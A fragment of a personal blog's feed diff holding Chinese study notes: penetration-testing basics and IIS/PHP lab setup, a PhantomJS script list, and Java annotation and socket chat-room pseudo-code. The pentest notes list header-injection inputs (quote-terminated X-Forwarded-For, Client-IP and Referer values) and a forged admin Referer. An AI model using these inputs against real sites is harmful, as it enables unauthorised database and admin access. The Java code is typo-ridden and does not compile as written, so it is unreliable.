(linux对大小写敏感)        (伪静态:其实是动态.reg:xxx.html)        (测试:xxx.asp,xxx.jsp,xxx.php aspcms2.0)        http头讲解:        200    响应码(代表页面存在)        date        content-type    类型        cookie            -&gt;        reg:            浏览器-&gt;工具-&gt;代理-&gt;bp-&gt;抓包            打开安全工具包-&gt;漏洞分析-&gt;burpsuite            proxy-&gt;intercept-&gt;intercept is on            (x-forwarded-for:)(ip-client)(referer)        http请求方法:            get,post,options,put,move,delete,trace            dz论坛,通过http头突破            访问后台管理系统:            Referer:http://xx.xx.x.x:xx/admin/            (写入到数据库中)            x-forwarded-for:a.b.c.d&apos;            client-ip:a.b.c.d&apos;            refere:&apos;            安全狗(走tcp三次握手来获取网站的,而不是http头的)(ack,seq)            https协议:            http+ssl/tls    网站搭建配置:        VM        (工具搭)        asp-&gt;(小旋风?直接启动)        php-&gt;代码审计-&gt;phpStudy2014(可以切换各种版本的php和apache)        (IIS搭)        VM-&gt;开始-&gt;管理您的服务器-&gt;添加或删除角色-&gt;自定义配置-&gt;        IIS-&gt;两个都勾.        安装完成之后-&gt;开始-&gt;管理工具-&gt;IIS-&gt;网站-&gt;默认-&gt;换成源码站        权限-&gt;添加一个everyone        asp的话-&gt;web服务扩展-&gt;Active Server Pages启用        网站-&gt;右键-&gt;文档-&gt;全删除-&gt;添加index.asp        主目录-&gt;配置-&gt;选项-&gt;调试-&gt;复选勾选上        php-&gt;zKeysPHP.exe(配搭的是mySQL)        IIS-&gt;网站-&gt;新建-&gt;ip,端口(换一个)-&gt;要勾选一个运行脚本(php)        属性-&gt;文档-&gt;index.php-&gt;配置-&gt;映射查看有没有.php        php-&gt;添加源码网站-&gt;权限问题就设置源码文件的权限.        新建数据库-&gt;U/P:root/zkeys        属性-&gt;IP-&gt;可以绑定一个        多个IP设置:不自动获取,手写.        php属性-&gt;IP-&gt;高级网站标识-&gt;添加</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;`测试会用到虚拟机,一般加个内存条就行
+
+`会考试,笔试+机试
+
+被抓的话挂VPN也没用
+
+常用的术语:
+1.脚本(asp,php,jsp)    --右击看不到源代码
+2.html(css,js,html)
+3.HTTP协议    --https(加密)    --http抓包能抓到账号密码
+4.CMS(B/S)(sei mou si)   DZ,南方,帝国,思途,dedecms    
+    --企业网站用(),医院(织梦:做SU好优化,好推广),学校(织梦),博客(wordpress)
+    --论坛(DZ(discuz))
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>本地phantomjs学习列表</title>
+    <link href="prayer007007.github.io/2018/09/10/%E6%9C%AC%E5%9C%B0phantomjs%E5%AD%A6%E4%B9%A0%E5%88%97%E8%A1%A8/"/>
+    <id>prayer007007.github.io/2018/09/10/本地phantomjs学习列表/</id>
+    <published>2018-09-09T19:31:15.000Z</published>
+    <updated>2018-09-09T11:32:39.240Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>====================================&quot;use strict&quot;; //引用后js编写进入严格模式phantomjs test1.js //直接执行js文件 , 并将网页以图片返回arguments.js //加载参数并循环输出time_plan.js //定时器module.js , universe.js //module加载universe里面的answer方法，（模块化）loadspeed.js //简单的加载参数例子netlog.js //简单的request，response监控</code></pre><a id="more"></a>    <pre><code>title_test.js //简单的evaluate与onConsoleMessage效果演示useragent.js //简单的查看useragent，并更改useragent，及其调用js语法loadjquery.js //简单加载jquery文件用以使用jquery语法echoToFile.js //简单写入文件fibo.js //简单的斐波队列printenv.js //打印环境变量outputEncoding.js //改变encoding编码打印字scandir.js.//js列出文件路径名称及子文件路径名称sleepsort.js //根据它们的值排序整数和延迟显示version.js //输出phantomjs版本号color wheel.js //打造一个全色的圆rasterize.js //将网页栅格化为图像或者pdfrender_multi_url.js //将多个网页呈现为图像injectme.js //将自身js注入网页上下文中*page_events.js //js黑注入的测试代码*unrandomize.js //人工修改Math.random函数，并在页面初始化时加载，伪造函数detectedniff.js //检测网页是否嗅探用户代理post.js //向测试服务器发送HTTP POST请求postserver.js //启动一个web服务器并向它发送一个HTTP POST请求server.js //启动一个web服务器并向它发送一个HTTP GET请求serverkeepalive.js //启动一个以纯文本回答的web服务器simpleserver.js //启动一个以HTML格式回答的web服务器features.js //检测使用的浏览器功能modernizr.jsuseragent.js //更改浏览器的用户代理属性run-jasmine.js //运行基于jasmine的测试run-qunit.js //运行基于Qunit的测试====================================</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;====================================
+&amp;quot;use strict&amp;quot;; //引用后js编写进入严格模式
+phantomjs test1.js //直接执行js文件 , 并将网页以图片返回
+arguments.js //加载参数并循环输出
+time_plan.js //定时器
+module.js , universe.js //module加载universe里面的answer方法，（模块化）
+loadspeed.js //简单的加载参数例子
+netlog.js //简单的request，response监控
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="前端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%89%8D%E7%AB%AF/"/>
+    
+      <category term="Node" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%89%8D%E7%AB%AF/Node/"/>
+    
+      <category term="phantomjs" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%89%8D%E7%AB%AF/Node/phantomjs/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%89%8D%E7%AB%AF/Node/phantomjs/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%89%8D%E7%AB%AF/Node/phantomjs/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="phantomjs" scheme="prayer007007.github.io/tags/phantomjs/"/>
+    
+      <category term="NodeJs" scheme="prayer007007.github.io/tags/NodeJs/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>JavaSE学习笔记01-注解与反射</title>
+    <link href="prayer007007.github.io/2018/09/10/JavaSE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E6%B3%A8%E8%A7%A3%E4%B8%8E%E5%8F%8D%E5%B0%84/"/>
+    <id>prayer007007.github.io/2018/09/10/JavaSE学习笔记01-注解与反射/</id>
+    <published>2018-09-09T19:28:21.000Z</published>
+    <updated>2018-09-09T11:28:57.552Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>一、java se之注解与反射1、注解的由来     将不包含业务逻辑的部分，也称作服务或能力，     直接通过标注(注解，Annatation)来定义与识别，不再通过xml等配置。     减少配置量,项目一大配置太多，反而成为负担2、关于配置与注解     1.1 注解的优势：配置的烦锁与注解的灵活     1.2 注解的劣势：太灵活导致维护性差     1.3 实战项目选择：配置+注解</code></pre><a id="more"></a>         <pre><code>3、关于反射     3.1 “正射”：通过正常的import等引用，直接new出来的对象。     3.2 “反射”：通过Class字节码对象来实例化其对应的实例。     3.3 强大的反射无处不在，hadoop,nutch,spark等通过配置即可看出大部分应用到反射。     3.4 正向代理与反向代理         正向与反向，你可以认为从客户端角度来说的。     客户端能知道代理的存在，则为正向。那么爬虫代理显然是正向代理     客户端不知道代理的存在，则为反向。apache httpd,nginx均常做反向代理，多用于负载均衡等场景。4、常用注解   Override：用于检查方法是否被真正准确的重写   Deprecated: 用于标志属性、方法等已经过时，不再建议被使用   SuppressWarnings : 阻止某些情况下的warnning信息5、元注解：注解的注解   Retention：保持力，保留范围       source: 注解信息只在源文件中       class:在字节码文件中，但不被jvm加载与识别       runtime:在字节码中，被jvm加载，主要用于反射   Target       注解的修饰类型，包括包、类、方法、属性、局部变量等,通过ElementType枚举类来搞定。   Documented        该注解是否也加入到java doc   Inherited    该注解能否被继承5、注解的用法与autowired的简单实现6、总结   循序渐进，锲而不舍。   细致耐心，高手可成。</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;一、java se之注解与反射
+
+1、注解的由来
+     将不包含业务逻辑的部分，也称作服务或能力，
+     直接通过标注(注解，Annatation)来定义与识别，不再通过xml等配置。
+     减少配置量,项目一大配置太多，反而成为负担
+
+2、关于配置与注解
+     1.1 注解的优势：配置的烦锁与注解的灵活
+     1.2 注解的劣势：太灵活导致维护性差
+     1.3 实战项目选择：配置+注解
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="Java" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
     
     
       <category term="Java" scheme="prayer007007.github.io/tags/Java/"/>
     
-      <category term="JavaScript" scheme="prayer007007.github.io/tags/JavaScript/"/>
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>JavaSE学习笔记01--网络编程</title>
+    <link href="prayer007007.github.io/2018/09/10/JavaSE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
+    <id>prayer007007.github.io/2018/09/10/JavaSE学习笔记01-网络编程/</id>
+    <published>2018-09-09T19:25:20.000Z</published>
+    <updated>2018-09-09T11:26:03.725Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>网络编程(network programming)1、何为网络遍程   1.1 网络编程是网站、网页编程的底层基础,但与他们不相等、不同。       网络编程，对于高级开发语言面言，多是指基于socket的编程，         也就是面向tcp/udp的编程。       而网页编程，多是面向http协议编程。它是以网络编程为底层基础的。       通过网络编程的参考模型可知。</code></pre><a id="more"></a>           <pre><code>   1.2 网络互联参考模型       1.2.1 学术界的参考模型OSI:open system interconnection             7层：从底向上为：                  物理层：封装的底层电气、机械特性，即0、1传输，以bit为单位              数据链路层：是对0、1等最基本单位的封装，成为各种传输单元。              网络层：将下层封装起来的数据单元从src终端传到dst终端。这里只是说计算机之间的到达，即端到端的传输。              传输层：上边是端到端，即机器到机器。该处即为机器内的进程到机器内的进程的传输。                      即是tcp/udp编程的所在层。              会话层：维持网络联接的开始、中断、重启。              表示层：为应用层提供加解密、解码等操作。              应用层：如http、ftp、smtp等协议集中在此。像大数数的应用编程多集于此层开发。              工业界的实际参考模型Tcp/IP：tcp and ip protocol group               4层：从底向上：                 osi的第1、2层合成该层:             网络层：             传输层：             osi的第5、6、7层合成该层：          1.2.2 启示          分层的设计架构：到目前也是无处不在，是最主流的解决复杂网络、软件设计等问题的方案，即分层的设计思路。              包括nutch、hadoop、lucene、spark等等均是在不断的分层过程中逐渐发展壮大的。          以及现在java web设计之最流行的MVC，model-view-control，即是经典的分层。          启示结果：解析复杂问题的最有效方法，即是分层架构设计。   1.3 tcp、udp优缺点       tcp:面向链接、可靠的数据传输，           主要在于三次握手，最后有4次握手释放链接。       效率相对低。           应用场景：讲究可靠、有序性，像打电话、QQ聊天、浏览器浏览网页等。       相对来说tcp的应用范围更广。       udp:面向无链接，不可靠的数据传输。           效率相对高。           应用场景：对可靠性要求不高的情况，像语音聊天、游戏场景(war3)等等。2、难点   2.1 多线程编程       多线程的同步处理   2.2 高效率       并发一高，会导致通讯变慢等情况。       解决这一问题，可以通过java nio编程，即非阻塞方式，即通道channel和选择器selector来搞定。3、重点   3.1 网络io流的熟练掌握          网络编程，关键就是数据流的传输，故io流要熟练。   3.2 java socket编程api熟练掌握          网络编程的核心包即java.net包，重要api均在此。4、实战项目   4.1 类QQ群的网络聊天室       4.1.1 面向对象分析：           (1)socket server     (2)socket client,分两个client。         第1个client,是用户端的client。         第2个client,是服务器的client，是服务器端为了接收与响应客户端的client来初始化工作。     (3)守护线程 daemone thread     (4)系统启动器，即controler部分     (5)业务管理器，即manager部分     (6)数据解析类，即发送或接收到的数据的解析   4.2 功能模块划分       (1) 用户端之客户端           * 通过读取console端输入的数据，写给服务器端socket server。     * 读取socket server发过来的消息，构成实际的网络聊天室。     ps: 以上两点要并行执行，即要产生两个线程       (2) 服务器端，做接受和分发客户端           * 通过socket server的accept方法，接受user client，并初始化一个       server端的client与之对应。完成双方的socket读写。     * 读取服务器的console输入,即服务器端要给客户端的消息，并通过守护线程实际写给各user client       (3) 服务器端之客户端     * 读取user client的信息，给服务器的消息管理器。最后由守护线程来完成真正的分发。     * 读取服务器端要写给user client的消息，最终通过持有的user client socket的写入流将数据           写给user client端。    统一用语：         用户端的客户端：user client   服务器的客户端：server client   服务器本身：    socket server4.3 类QQ的聊天器。    经过聊天室的程序改造，即可完成该任务。    些任务留做各位同学的课后作业吧，有兴趣的一定要亲自去改改。</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;网络编程(network programming)
+
+1、何为网络遍程
+   1.1 网络编程是网站、网页编程的底层基础,但与他们不相等、不同。
+       网络编程，对于高级开发语言面言，多是指基于socket的编程，
+         也就是面向tcp/udp的编程。
+       而网页编程，多是面向http协议编程。它是以网络编程为底层基础的。
+       通过网络编程的参考模型可知。
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="Java" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Java" scheme="prayer007007.github.io/tags/Java/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>JavaSE学习笔记02--网络编程</title>
+    <link href="prayer007007.github.io/2018/09/10/JavaSE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
+    <id>prayer007007.github.io/2018/09/10/JavaSE学习笔记02-网络编程/</id>
+    <published>2018-09-09T19:20:56.000Z</published>
+    <updated>2018-09-09T11:24:54.043Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>JavaSE-网络编程并发一高，会导致通讯变慢等情况。解决这一问题，可以通过java nio编程，即非阻塞方式，即通道channel和选择器selector来搞定。NetChartDemo_1    src        com.ztl.controler            SystemController();//系统启动器        com.ztl.iface.parser            IMessageParser();        com.ztl.iface.thread            IServerSocketThread();        com.ztl.impl.parser            MessageParserImpl();</code></pre><a id="more"></a>                <pre><code>        com.ztl.impl.thread            ServerSocketThreadImpl();   //改名为SocketServerRunnableImpl();            ClientSocketRunnable();        //改名为ServerClinetRunnable();            UserClientSocketRunnable(); //copy ClientSocketRunnable();            DaemonThread(); //守护线程部分，负责打印统计信息，报告信息等        com.ztl.manager            MessageQueueManager(); //消息队列管理器            MessageParserManager(); //消息解析器        com.ztl.pojos            MessageQueuePojo(); //消息队列pojo类        com.ztl.utils            SystemParas();    //系统参数配置工具类            ReadConfigUtils(); //读取配置文件的工具类            StaticValue(); //静态变量定义工具类    test //测试 Source Folder    resources //配置文件夹 Source Folder        application.properties.    libapplication.properties:#net chat confignode_master=true# node_master=falseserver_socket_port=9999server_socket_wait_accept_max_pool=5nick_name=天亮教育server_socket_ip = 127.0.0.1max_connection_client_number=10pubilc class ReadConfigUtil{    private Properties config = null;    public ReadConfigUtil(String configFile){        InputStream in = ReadConfigUtil.class.getClassLoader()            .getResourceAsStream(&quot;application.properties&quot;);        config = new Properties();        try{            Reader reader = new InputStreamReader(in,StaticValue.default_encoding));            config.load(reader);            reader.close();        }catch(IOException e){            sout(&quot;none properties&quot;);        }    }    //根据key读取value    public String getValue(String key){        // Properties props = new Properties();        try{            String value = config.getProperty(key);            return value;        }catch(Exception e){            e.printStackTrace();            sout(&quot;ConfigInfoError&quot; + e.toString());            return null;        }    }    psvm(){        sout();    }}public class SystemParas{    //初始化配置文件读取类    public static ReadConfigUtil configUtil = new ReadConfigUtil(&quot;application.properties&quot;);    //读取出各配置项，以备任何该项目中的类使用    public static boolean is_node_master = Boolean.parserBoolean(configUtil.getValue(&quot;node_master&quot;));    public static String nick_name = configUtil.getValue(&quot;nick_name&quot;);    public static int max_connection_client_number = Integer.parserInt(configUtil.getValue(&quot;max_connection_client_number&quot;));    public static int server_socket_port = Integer.parserInt(configUtil.getValue(&quot;server_socket_port&quot;));    public static int server_socket_wait_accept_max_pool = Integer.parserInt(configUtil.getValue(&quot;server_socket_wait_accept_max_pool&quot;));    public static String server_socket_ip = configUtil.getValue(&quot;server_socket_ip&quot;);    main(){        sout(configUtil.getValue(&quot;nick_name&quot;));        sout(configUtil.getValue(&quot;node_master&quot;));        sout(configUtil.getValue(&quot;max_connection_client_number&quot;));    }}public class StaticValue{    public static String default_encoding = &quot;utf-8&quot;;    public static String sepratar_next_line = &quot;\n&quot;;}socket server:public interface IServerSocketThread{}public class ServerSocketThreadImpl implements Runnable{    private String nickName;    private ServerSocket serverSocket;    private MessageQueueManager messageQueueManager;    //private ThreadGroup threadGroup; //线程组，用来统一管理client，socket的各个线程    private List&lt;ServerClientSocketRunnable&gt; serverClientList;    private boolean isRunning = true; //状态位    public ServerSocketThreadImpl(String nickName,ServerSocket serversocket){        this.nickName = nickName;        this.serverSocket = serverSocket;        messageQueueManager = new MessageQueueManager();        //开启管理员向user client端发送消息        AdminWriteMessageRunnable adminWriteMessageRunnable = new AdminWriteMessageRunnable(messageQueueManager);        new Thread(adminWriteMessageRunnable).start();        //this.threadGroup = new ThreadGroup(&quot;socket_client_group&quot;);        serverClientList = new LinkedList&lt;ServerClientSocketRunnable&gt;();        this.isRunning = true;        //在socket server启动守护线程        DaemonThread daemonThread = new DaemonThread(serverClientList,messageQueueManager);        new Thread(daemonThread).start();    }    setter and getter    //实现server socket的主要处理逻辑即可    @Override    public void run(){        while(isRunning){            Socket client_socket = null;            try{                client_socket = serverSocket.accept(); //下一步封装后再加进线程组                //即server client线程                ClientSocketRunnable clientSocketRunnable = new ClientSocketRunnable(                    null,client_socket,this.messageQueueManager);                this.serverClientList.add(clientSocketRunnable);                new Thread(clientSocketRunnable).start();                sout(&quot;one client is online!&quot;);            }catch(){                xxx            }        }    }    // 管理员要写给各客户端的runnable类        class AdminWriteMessageRunnable implements Runnable{        private MessageQueueManager messageQueueManager;        private BufferedReader bufferReader;        private boolean isRunnable = true;        public AdminWriteMessageRunnable(MessageQueueManager messageQueueManager){            this.messageQueueManager = messageQueueManager;            this.isRunnable = true;            try{                this.bufferReader = new BufferedReader(new InputStreamReader(System.in.getInputStream(),                    StaticValue.default_encoding));            }catch(){                xxx            }        }        @Override        public void run(){            String temp_line = null;            while(isRunnable){                try{                    temp_line = this.bufferReader.readLine();                    sout(&quot;admin by server to client---&quot; + temp_line);                }catch(){                    xxx                    }            }        }    }}//server clinet runnable.   改名为ServerClientSocketRunnablepublic class ClientSocketRunnable implements Runnable{    private Socket clientSocket;    private String nickName;    //这里如果想随意写或者随意读，就要独立出来    private BufferedWriter bufferWriter;    private BufferedReader bufferReader;    setter and getter    //封装的由server client向user client发送消息的方法    public void writerToUserClient(String message){        try{            this.bufferWriter.write(message);            this.bufferWriter.flush();        }catch(){            xxx        }    }    private MessageParserManager messageParserManager;    private boolean isRunnable = true;    private MessageQueueManager messageQueueManager;    public ClientSocketRunnable(String nickName, Socket clientSocket,MessageQueueManager messageQueueManager){        this.nickName = nickName;        this.clientSocket = clientSocket;        this.messageParserManager = new MessageParserManager();        this.messageQueueManager = messageQueueManager;        this.isRunnable = true;        try{            this.bufferReader = new BufferedReader(new InputStreamReader(this.clientSocket.getInputStream(),                StaticValue.default_encoding));            this.bufferWriter = new BufferedWriter((new OutputStreamWriter(this.clientSocket.getOutpuStream,                StaticValue.default_encoding));        }catch(){            xxx        }    }    @Override    public void run(){        String temp_line = null;        while(isRunnable){            try{                temp_line = this.bufferReader.readLine();                messageQueueManager.addOneMessage(temp_line);                sout(&quot;server from client message----&quot; + temp_line);            }catch{            }        }    }    /*    class ServerClientWriteRunnable implements Runnable{        private BufferedWriter bufferWriter;        public ServerClientWriteRunnable(BufferedWriter bufferWriter){        }    }    */}public class UserClientSocketRunnable implements Runnable{    private Socket clientSocket;    private String nickName;    //这里如果想随意写或者随意读，就要独立出来    private BufferedWriter bufferWriter;    private BufferedReader bufferReader;    private BufferedReader consoleBufferReader;    private MessageParserManager messageParserManager;    private boolean isRunnable = true;    private MessageQueueManager messageQueueManager;    public ClientSocketRunnable(String nickName, Socket clientSocket,MessageQueueManager messageQueueManager){        this.nickName = nickName;        this.clientSocket = clientSocket;        this.messageParserManager = new MessageParserManager();        this.isRunnable = true;        try{            this.consoleBufferReader = new BufferedReader(new InputStreamReader(System.in.getInputStream(),                StaticValue.default_encoding));            this.bufferReader = new BufferedReader(new InputStreamReader(this.clientSocket.getInputStream(),                StaticValue.default_encoding));            this.bufferWriter = new BufferedWriter((new OutputStreamWriter(this.clientSocket.getOutpuStream,                StaticValue.default_encoding));            //开启从服务端读取消息线程            ReadSocketServerRunnable readSocketServerRunnable=new ReadSocketServerRunnable(this.bufferReader);            new Thread(readSocketServerRunnable).start();        }catch(){            xxx        }    }    @Override    public void run(){        String temp_line = null;        while(isRunnable){            try{                temp_line = this.consoleBufferReader.readLine();                this.bufferWriter.write(temp_line + StaticValue.sepratar_next_line);                this.bufferWriter.flush();                sout(&quot;client to server message----&quot; + temp_line);            }catch{            }        }    }    class ReadSocketServerRunnable implements Runnable{        private BufferedReader bufferReader;        private boolean isRunning = true;        public ReadSocketServerRunnable(BufferedReader bufferReader){            this.bufferReader = bufferReader();            isRunning = true;        }        @Override         public void run(){            String temp_line = null;            while(isRunning){                try{                    temp_line = this.bufferReader.readLine();                    sout(&quot;server to client---&quot; + temp_line);                }catch(){                    xxx                }            }        }    }}public class DaemonThread implements Runnable{    //持有所有客户端socket线程    //private ThreadGroup threadGroup;    private List&lt;ServerClientSocketRunnable&gt; serverClientList;    //待向所有客户端发送消息的消息队列管理器    private MessageQueueManager messageQueueManager;    private boolean isRunning = true;    pubilc DaemonThread(List&lt;ServerClientSocketRunnable&gt; serverClientList,MessageQueueManager messageQueueManager){        //this.threadGroup = threadGroup;        this.serverClientList = serverClientList;        this.messageQueueManager = messageQueueManager;        this.isRunning = true;    }    @Override    public void run(){        String message = null;        while(isRunning){            message = messageQueueManager.getOneMessage();            //这里可能会有异常，解决方法：加锁            for(ServerClientSocketRunnable serverClientSocketRunnable:serverClientList){                serverClientSocketRunnable.writeToUserClient(message+StaticValue.sepratar_next_line);            }            sout(&quot;daemon by server to client-- &quot; + message);        }    }}public class MessageQueuePojo{    private LinkedList&lt;String&gt; messageList;    setter and getter    public MessageQueuePojo(){        this.messageList = new LinkedList&lt;String&gt;();    }    public void addMessage(String oneMeassage){        sychronized(this){            this.messageList.add(oneMessage);            this.notifyAll();//多个用户        }    }    public String popMessage(){        String message = null;        sychronized(this){            message = this.messageList.poll();            while(message == null){                try{                    this.wait();                }catch(){                }                message = this.messageList.poll();            }            return message;        }    }}pubilc class MessageQueueManager{    private MessageQueuePojo messageQueue;    public MessageQueueManager(){        this.messageQueue = new MessageQueuePojo();    }    public String getOneMessage(){        return this.messageQueuePojo.popMessage();    }    public void addOneMessage(String message){        this.messageQueuePojo.addMessage(message);    }}public class SystemController{    psvm(){        if(SystemParas.is_node_master){//说明是服务节点            //port会被绑定，不需要bind            ServerSocket serverSocket = new ServerSocket(SystemParas.server_socket_port,SystemParas.server_socket_wait_accept_max_pool)            ServerSocketThraadImpl serverSocketRunnable = new ServerSocketThreadImpl(                SystemParas.nick_name,serverSocket);            Thread serverThread = new Thread(serverSocketRunnable);            serverThread.start();            sout(&quot;socket server have started&quot;);        }else{//说明是socket client节点            //这里测试的时候，要先开启server服务，再把node_master改为false。当client启动成功的时候，会反馈一条信息给server端            Socket socket = new Socket(SystemParas.server_socket_ip,SystemParas.server_socket_port);            ClientSocketRunnnable clientSocketRunnable = new ServerSocketThreadImpl(                SystemParas.nick_name,serverSocket);            Thread serverThread = new Thread(clientSocketRunnable);            serverThread.start();            sout(&quot;socket client have started&quot;);        }    }}public interface IMessageParser{    public String parser(String message);}public class MessageParserImpl implements IMessageParser{    @Override    public String parser(String message){        return null;    }}public class MessageParserManager{    private IMessageParser iMessageParser;    public MessageParserManager(){        this.iMessageParser = new MessageParserImpl();    }    pubilc String parser(String content){        return this.iMessageParser.parser(content);    }}</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;JavaSE-网络编程
+
+
+并发一高，会导致通讯变慢等情况。
+解决这一问题，可以通过java nio编程，即非阻塞方式，即通道channel和选择器selector来搞定。
+
+NetChartDemo_1
+    src
+        com.ztl.controler
+            SystemController();//系统启动器
+        com.ztl.iface.parser
+            IMessageParser();
+        com.ztl.iface.thread
+            IServerSocketThread();
+        com.ztl.impl.parser
+            MessageParserImpl();
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="Java" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/%E5%9F%BA%E7%A1%80/"/>
+    
